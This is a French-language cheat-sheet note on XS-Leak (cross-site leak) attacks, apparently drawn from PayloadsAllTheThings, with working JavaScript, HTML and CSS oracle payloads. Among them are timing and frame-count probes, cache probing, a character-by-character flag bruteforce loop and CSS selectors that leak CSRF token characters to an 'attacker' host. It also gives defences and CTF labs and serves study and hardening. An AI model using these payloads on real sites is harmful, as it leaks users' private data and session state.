---
title: "XS-Leak"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# XS-Leak — Cross-Site Leaks

> [!info] **En 1 phrase**
> XS-Leak = déduire des données d'une origine cible **sans jamais lire le corps de la réponse** :
> on transforme le navigateur de la victime en **oracle** (timing, erreurs, cache, frames, navigation)
> pour répondre à une question binaire — *le secret existe-t-il ? commence-t-il par tel caractère ?* —
> et bruteforcer l'information **bit par bit**.
>
> Source principale : **[PayloadsAllTheThings — XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XS-Leak/README.md)**

---
## Concept

```mermaid
flowchart LR
    A[Page malveillante<br>chez l'attaquant] --> B[Chargement cross-origin<br>iframe / image / script / fetch]
    B --> C[Ressource cible<br>dépendante d'un secret]
    C --> D[Oracle navigateur<br>timing · erreur · cache · frames]
    D --> E[Réponse binaire<br>true / false]
    E --> F[Bruteforce du secret<br>caractère par caractère]
```

> [!info] **Différence avec XSS**
> ```txt
> XSS     = lire le CORPS de la réponse  → le JS s'exécute DANS l'origine cible.
> XS-Leak = observer les EFFETS DE BORD du navigateur → jamais de lecture du contenu.
> ```
> Une **leak** = l'information transite par un canal indirect (side-channel) : la durée d'une
> requête, la présence d'une erreur, l'état du cache. L'attaquant ne connaît jamais la donnée
> brute, seulement la **réponse oui/non** d'un test qu'il a formulé.

---
## Primitives d'attaque (Oracles cross-origin)

| Primitive | Ce que ça fuit |
|---|---|
| **Timing** | Taille / complexité de la ressource, temps de traitement |
| **Frame count** | Nombre de résultats, différences de contenu (`window.length`) |
| **Erreurs** | Décisions d'accès (200 vs 403/404), blocages (CORS, XFO, CSP) |
| **Cache** | Visites précédentes, état de connexion |
| **Navigation** | État d'authentification, redirections |
| **Rendu** | Longueur du texte / valeurs d'attributs (via CSS) |

---
## Frame Counting (`window.length`)

> La propriété `window.length` (nombre d'iframes d'une fenêtre) est **lisible cross-origin**.
> Si la page cible charge N sous-frames selon un secret (ex : résultats de recherche, avatars),
> on compte ces frames pour déduire la donnée.

```js
// Ouvrir la cible en popup puis compter ses iframes
var win = window.open('https://example.org');
setTimeout(() => {
  console.log("%d iframes détectés", win.length);
}, 2000);
```

```html
<!-- Via iframe : la page de résultats charge > 0 frames s'il y a des résultats -->
<iframe src="https://target/search?q=FLAG{..." onload="check()"></iframe>
<script>
function check() {
  const f = document.querySelector('iframe');
  if (f.contentWindow.length > 0) exfil('résultat trouvé');
  else exfil('rien');
}
</script>
```

---
## Image Loading Oracle (onload / onerror)

> L'événement de chargement d'une image cross-origin est observable : `onload` = ressource
> **chargée** (2xx, contenu image valide), `onerror` = **absente / protégée / mauvais type**.
> Oracle de présence parfait. Astuce : lier une image 1x1 factice en "sentinelle" pour
> distinguer un vrai 200 (largeur 1) d'un 200 générique.

```js
const img = new Image();
img.onload  = () => exfil('ressource accessible / existe');
img.onerror = () => exfil('ressource absente / interdite');
img.src = 'https://target/api/avatar?id=1337';
```

---
## Event Handler Leaks (script / stylesheet / object)

> Le navigateur déclenche `onload`/`onerror` sur les éléments cross-origin ; on compare le
> comportement selon la donnée à tester (ex : `onerror` = 404 → secret inexistant).

```html
<!-- Script : onload = chargé, onerror = erreur (404, blocage, mauvais type) -->
<script src="https://target/secret.js" onload="exfil('load')" onerror="exfil('error')"></script>

<!-- Stylesheet -->
<link rel="stylesheet" href="https://target/style.css" onload="exfil('load')" onerror="exfil('error')">

<!-- Object -->
<object data="https://target/data" onload="exfil('load')" onerror="exfil('error')"></object>
```

> [!tip] **Id Attribute Leak** : un élément focusable avec un `id` connu provoque un `blur`
> quand il disparaît → tester la présence d'un id via `onblur`.
> (voir [xsinator](https://xsinator.com/testing.html#Id%20Attribute%20Leak))

---
## Timing Attacks

> Mesurer la durée d'une requête cross-origin (`fetch no-cors`, `performance.now`) : une requête
> qui renvoie des résultats traite plus de code/données → plus lente. C'est l'oracle de base du **XS-Search**.

```js
// Comparer les temps de réponse d'une recherche
const t0 = performance.now();
fetch('https://target/search?q=secret', { mode: 'no-cors' }).then(() => {
  const dt = performance.now() - t0;
  exfil(dt > 150 ? 'résultat trouvé (plus lent)' : 'rien (rapide)');
});
```

```js
// Mesure via iframe (timing du chargement complet)
const t0 = performance.now();
const f = document.createElement('iframe');
f.src = 'https://target/search?q=' + query;
f.onload = () => exfil(performance.now() - t0);
document.body.appendChild(f);
```

### Resource Timing (Performance API)

```js
// Liste des ressources chargées + durées (cross-origin si Timing-Allow-Origin présent)
performance.getEntriesByType('resource').forEach(r => {
  exfil(r.name, r.duration, r.transferSize);
});
```

> [!warning] La précision des timers est **réduite par défaut** (anti-fingerprinting).
> Répéter les mesures (100+ échantillons) et comparer **médianes** ou moyennes.

---
## window.open / location / COOP

```js
// COOP : si la cible envoie Cross-Origin-Opener-Policy: same-origin,
// window.open renvoie null (la popup n'est jamais créée)
const w = window.open('https://target/');
if (w === null) exfil('COOP: same-origin présent');
else exfil('pas de COOP');
```

```js
// X-Frame-Options : contentDocument est null si le iframe est bloqué
const f = document.createElement('iframe');
f.src = 'https://target/';
f.onload = () => {
  try {
    if (f.contentDocument) exfil('framable (pas de X-Frame-Options)');
    else exfil('X-Frame-Options DENY / SAMEORIGIN');
  } catch (e) { exfil('X-Frame-Options (SecurityError)'); }
};
document.body.appendChild(f);
```

```js
// Redirection : comparer location avant/après ou utiliser le Fetch Redirect Leak
fetch('https://target/login', { mode: 'no-cors', redirect: 'manual' })
  .then(r => exfil('redirect → ' + r.type));   // 'opaqueredirect' vs 'opaque'
```

---
## postMessage & Error Messages

```js
// La cible accepte-t-elle des messages ? répond-elle ?
const w = window.open('https://target/');
window.addEventListener('message', (e) => exfil('réponse : ' + e.data), false);
setTimeout(() => w.postMessage('ping', '*'), 2000);
```

```html
<!-- MediaError : le code d'erreur des médias reflète le status HTTP -->
<video id="v" src="https://target/media/1"></video>
<script>
  const v = document.getElementById('v');
  v.addEventListener('error', () => {
    if (v.error && v.error.code === MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED) {
      exfil('pas une ressource média → status ≠ 200');
    }
  });
</script>
```

> [!tip] **CORS Error Leak** : une `fetch` cross-origin sans CORS échoue avec un message
> contenant parfois l'**URL de redirection finale** → lecture de l'URL cible.
> **CSP Violation Leak** : un report de violation CSP peut embarquer la cible de redirection.

---
## CSS Oracles (sélecteurs)

> Quand l'attaquant peut injecter du CSS ou un style cross-origin, les **sélecteurs d'attributs**
> créent des requêtes conditionnelles : le background ne s'applique que si le test est vrai.

```css
/* Préfixe : tester la première lettre d'un attribut */
input[name="csrf"][value^="a"] { background: url(https://attacker/leak?char=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker/leak?char=b); }
input[name="csrf"][value^="c"] { background: url(https://attacker/leak?char=c); }

/* Rendu : tester la longueur du texte (overflow/truncation) */
textarea[name="secret"] { height: 1px; }
p.text-truncate { white-space: nowrap; overflow: hidden; }
```

> [!info] Les requêtes CSS révèlent quelles valeurs **existent** (logs du serveur de
> l'attaquant) : même principe que le loading oracle, appliqué au rendu.
> → Détail complet : [[CSS Injection| CSS]]

---
## Cache Probing (cache HTTP & bfcache)

> Le navigateur met en cache les réponses **déjà vues**. Si une ressource n'est mise en cache
> que pour les utilisateurs authentifiés (ou après une visite), mesurer la **deuxième** charge
> révèle l'état de la victime.

```js
// Probe binaire : la 2e requête est ~instantanée si la ressource est en cache
function probe(url, cb) {
  const i = new Image();
  i.onload = () => {
    const t0 = performance.now();
    const j = new Image();
    j.onload = () => cb(performance.now() - t0 < 30);   // < 30ms ≈ cache
    j.src = url;
  };
  i.src = url;
}
probe('https://target/private/avatar.png', (cached) =>
  exfil(cached ? 'session active (ressource en cache)' : 'pas de session'));
```

```js
// Variantes : script cross-origin (chargé seulement si connecté) et bfcache
const s = document.createElement('script');
s.src = 'https://target/analytics.js';
s.onload = () => exfil('en cache / déjà visité');
document.head.appendChild(s);

window.addEventListener('pageshow', (e) => {
  if (e.persisted) exfil('ressource déjà chargée dans cette session (bfcache)');
});
```

> [!tip] **Cache Leak (CORS / POST)** : vider le cache par une erreur CORS ou une requête
> `POST` puis re-tester → détecte précisément quelles ressources la page cible charge.
> (voir [xsinator](https://xsinator.com/testing.html#Cache%20Leak%20(CORS)))

---
## Side Channels navigateur (history, localStorage)

```js
// History Length Leak : comparer history.length avant/après une navigation
var w = window.open('about:blank');
// w.history est lisible tant que la fenêtre reste sur about:blank (same-origin)
// puis naviguer vers https://target → length change si la redirection est javascript:
```

```txt
localStorage : PAS lisible cross-origin (cloisonné par origine). Utile seulement :
- combiné à un XSS → exfiltration directe (hors périmètre XS-Leak pur) ;
- du côté ATTAQUANT : la popup malveillante est same-origin, on y stocke l'état des
  probes et les résultats partiels entre plusieurs mesures.
```

```txt
Spectre / Meltdown : la version "hardware" du même principe (mesurer des temps d'accès mémoire
pour lire des données d'une autre origine). Contre-mesuré par la Site Isolation, mais rappelle
que TOUTE mesure de temps/état peut fuiter.
```

---
## XS-Search (Cross-Site Search)

> **Principe** : abuser d'un moteur de recherche / filtre de l'app pour obtenir un **oracle
> booléen** — *la requête `?q=...` renvoie-t-elle des résultats ?* On teste une valeur, on
> observe l'effet de bord (temps, frames, erreurs), puis on **bruteforce caractère par caractère**.

### Oracles utilisables

| Oracle | Signal |
|---|---|
| **Timing** | Plus de résultats = plus lent à répondre |
| **Frame count** | Page de résultats qui charge N iframes/miniatures |
| **Image loading** | Présence d'un résultat = présence d'une image |
| **CSP violation** | Résultat → ressource bloquée par la CSP → événement (temps du report) |
| **Cache** | Les résultats d'une recherche précédente sont en cache |

### Payloads

```js
// Oracle timing : la requête avec résultats est plus lente
async function exists(q) {
  const t0 = performance.now();
  await fetch('https://target/search?q=' + encodeURIComponent(q), { mode: 'no-cors' });
  return (performance.now() - t0) > 200;
}
```

```js
// Oracle frame count : la page de résultats crée des iframes (1 par résultat)
function exists(q) {
  return new Promise((res) => {
    const f = document.createElement('iframe');
    f.src = 'https://target/search?q=' + encodeURIComponent(q);
    f.onload = () => res(f.contentWindow.length > 0);
    document.body.appendChild(f);
  });
}
```

```js
// Bruteforce du flag caractère par caractère
const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}';
let flag = 'FLAG{';
for (let i = 5; i < 50; i++) {
  let found = false;
  for (const c of ALPHABET) {
    if (await exists(flag + c)) { flag += c; found = true; break; }
  }
  if (!found || flag.endsWith('}')) break;
}
exfil(flag);
```

> [!tip] **Astuce CTF (source)** : ouvrir **50 onglets** de résultats et mesurer le timing du
> **report CSP** (iframe violant la CSP sur la page de résultats) → plus d'onglets = bruit moyenné,
> signal net. Lab : [Root-Me — XS Leaks](https://www.root-me.org/en/Challenges/Web-Client/XS-Leaks)

---
## Known Oracles (xsinator.com)

| Groupe | Oracle | Ce qu'il détecte |
|---|---|---|
| Cache | Cache Leak (CORS / POST) | Ressources chargées par la page |
| Frame | Frame Count Leak | Nombre d'iframes |
| Frame | ContentDocument X-Frame Leak | `X-Frame-Options` |
| Frame | Id Attribute Leak | `id` d'un élément focusable (`onblur`) |
| HTTP | CORS Error Leak | URL de redirection via erreur CORS |
| HTTP | Fetch Redirect Leak | Redirections HTTP via Fetch API |
| HTTP | Max Redirect Leak / URL Max Length Leak | Redirections serveur (limites) |
| HTTP | ETag Length Leak | Taille du corps via longueur du header ETag |
| HTTP | SRI Error Leak | Longueur du contenu (SRI mismatch) |
| HTTP | Download Detection | `Content-Disposition: attachment` |
| HTTP | Response splitting (prérequis CRLF) | Injecter des headers → caches/oracles falsifiables |
| Média | Media Dimensions / Duration Leak | Dimensions / durée des images & vidéos |
| Média | MediaError Leak | Status codes via `MediaError` |
| CSP | CSP Directive / Violation / Redirect Detection | Directives CSP, redirections cross-origin |
| COOP | COOP Leak | `Cross-Origin-Opener-Policy` via popup |
| CORB/CORP | CORB Leak / CORP Leak | `X-Content-Type-Options` + type / `CORP` |
| Event | Event Handler Leak (Object / Script / Stylesheet) | Erreurs de chargement |
| Performance | Performance API Error / X-Frame / Download / Empty Page | erreurs, XFO, downloads, pages vides |
| WebSocket | WebSocket Leak (FF / GC) | Nombre de websockets (épuisement du quota) |
| Divers | Payment API Leak | Un autre onglet utilise la Payment API |
| Divers | History Length Leak | Redirections `javascript:` |
| Divers | Duration Redirect Leak / Redirect Start Leak | Redirections cross-origin (durée) |
| Divers | Style Reload Error Leak / Request Merging Error Leak | Erreurs de chargement |

---
## Outils

```txt
xsinator.com (RUB-NDS) → Suite de tests de XS-Leak dans le navigateur (tous les oracles ci-dessus)
                         https://github.com/RUB-NDS/xsinator.com
AutoLeak (RUB-NDS)     → Trouve des XS-Leaks en diffant des DOM-Graphs entre deux états (session)
                         https://github.com/RUB-NDS/AutoLeak
Headless browser       → Puppeteer/Selenium : automatiser les mesures de timing répétées
```

---
## Détection & Défense

| Côté | Mesure | Détail |
|---|---|---|
| Session | Cookies `SameSite=Lax/Strict` | Ne plus envoyer les cookies en contexte cross-site (bloque la plupart des oracles) |
| Réseau | CSP (`frame-ancestors`, `default-src`, `connect-src`) | Limite les iframes et les ressources chargées cross-origin |
| Réseau | `COOP: same-origin` | Coupe la relation popup/opener (`window.open` → null) |
| Réseau | `COEP: require-corp` + `Cross-Origin-Resource-Policy` | Bloque le chargement cross-origin non autorisé → cache probing mort |
| Cache | Cache partitioning (Network Partition Key) | Cache cloisonné par site top-level → probing cross-site impossible |
| Réseau | `X-Content-Type-Options: nosniff` | Empêche le sniffing de type → CORB oracle inopérant |
| Réseau | **Jamais d'info sensible dans l'URL** | Tokens/session en query string = devinables via cache probing & history |
| Réponse | Tokens aléatoires / nonces dans le HTML | Réponse imprédictible → pas de test binaire par cache |
| Réponse | Padding / délais aléatoires | Fausse l'oracle de timing |
| Réponse | `Timing-Allow-Origin` restreint | Limite le Resource Timing cross-origin |
| Réponse | Rate limiting / CAPTCHA sur la recherche | Ralentit le bruteforce XS-Search |

> [!tip] **Tester chez soi** : créer 2 états (connecté / déconnecté) et vérifier que le signal
> (temps, frames, erreur, cache) **diffère**. Conditions d'exploitabilité : pas de CSP bloquante,
> pas de `SameSite=Strict`, pas de cache partitionné, ressource dépendante d'un secret.

---
## Tips & Pièges

> [!tip] **Prérequis clé**
> L'attaquant doit pouvoir **formuler la condition** à tester : un oracle ne répond qu'en
> true/false. Sans requête constructible (URL devinable, paramètre injectable dans la
> recherche), pas de XS-Leak exploitable.

> [!tip] **Combiner les oracles**
> Un seul oracle est rarement fiable → **empiler** timing + frame count + cache pour confirmer.
> Répéter les mesures (médiane sur ≥100 échantillons) pour lisser le bruit.

> [!warning] **Pièges classiques**
> - `SameSite=Lax` envoie quand même les cookies sur les **navigations top-level GET** →
>   une popup/iframe top-level peut encore fuiter.
> - Le cache HTTP a longtemps été **partagé** entre origines → re-tester à chaque version de navigateur.
> - **Fausses réponses** : adblockers, extensions, redirections CDN, compression qui faussent le
>   timing et les probes de cache.
> - `window.open` est souvent bloqué par le **popup blocker** (il faut un geste utilisateur).
> - **Bruit** : les autres onglets, le CPU et le réseau rendent les timing attacks instables.
> - Un oracle qui marche en labo ne marche pas forcément sur la cible (cache, priorités, CORP...).

> [!warning] **Limites**
> - Précision des timers réduite (anti-fingerprinting) → échantillons nombreux obligatoires.
> - La victime doit avoir une **session active** : sans données privées chargées, rien à fuiter.
> - XS-Search bruteforce = très bruité et lent : chercher d'abord une **borne de longueur**,
>   puis la valeur avec du préfixe connu.

---
## Labs

- Root-Me — XS Leaks (Web-Client) : https://www.root-me.org/en/Challenges/Web-Client/XS-Leaks
- xsinator.com (tester chaque oracle en live) : https://xsinator.com/testing.html

---
## Liens

- [[XSS (Cross-Site Scripting)| XSS]]
- [[CSS Injection| CSS]]
- [[Attaques JWT| JWT]]
- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
- Source : [PayloadsAllTheThings — XS-Leak](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XS-Leak/README.md)
